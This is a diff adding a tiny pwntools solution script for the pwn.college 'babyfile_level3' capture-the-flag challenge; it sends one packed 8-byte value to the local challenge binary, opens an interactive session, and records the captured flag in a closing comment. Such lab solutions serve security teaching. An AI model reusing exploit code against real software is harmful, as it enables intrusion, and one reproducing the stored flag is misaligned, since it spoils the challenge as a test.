@@ -1,0 +1,13 @@
+from pwn import *
+
+# dont have nothing to say
+
+context.arch = 'amd64'
+
+p = process("/challenge/babyfile_level3")
+
+payload = p64(1)
+p.send(payload)
+
+p.interactive()
+#pwn.college{A__-umiMPG8VaiSO9HKL-1-uuaq.dJDN0MDL2EzNyYzW}
